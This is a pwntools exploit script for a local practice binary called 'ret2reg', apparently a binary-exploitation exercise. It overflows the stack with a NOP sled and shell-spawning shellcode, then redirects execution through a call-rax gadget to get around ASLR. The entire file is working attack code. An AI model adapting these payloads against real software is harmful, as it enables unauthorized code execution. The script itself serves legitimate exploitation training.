#!/usr/bin/python3

from pwn import *

target = "./ret2reg"
context.binary = target

# gdb -q ret2reg $(ps -C ret2reg | grep ret2reg | awk '{print $1; exit}')
# (gdb) x $rsp -> 0x62616176
rsp = 0x62616176
offset = cyclic_find(rsp)

def test():
    p = process(target)
    pause()
    payload = cyclic(500)
    p.writeline(payload)
    p.interactive()

def exploit(search = True):
    p = process(target, aslr = False)
    pause()
    nop = asm(shellcraft.nop())
    payload = nop * 80
    payload += asm(shellcraft.sh())
    payload = payload.ljust(offset, nop)
    if search:
        payload += b"BBBB"
    else:
        # (gdb) x $rsp -> 0x7fffffffdd20
        payload += p64(0x7fffffffdd20)
    p.writeline(payload)
    p.interactive()

def ret2reg():
    p = process(target, aslr = True)
    pause()
    nop = asm(shellcraft.nop())
    payload = nop * 80
    payload += asm(shellcraft.sh())
    payload = payload.ljust(offset, nop)
    # objdump -D ret2reg | grep call | grep ax -> 401010
    payload += p64(0x401010)
    p.writeline(payload)
    p.interactive()

def main():
    fn = ret2reg
    fn()

if __name__ == "__main__":
    main()
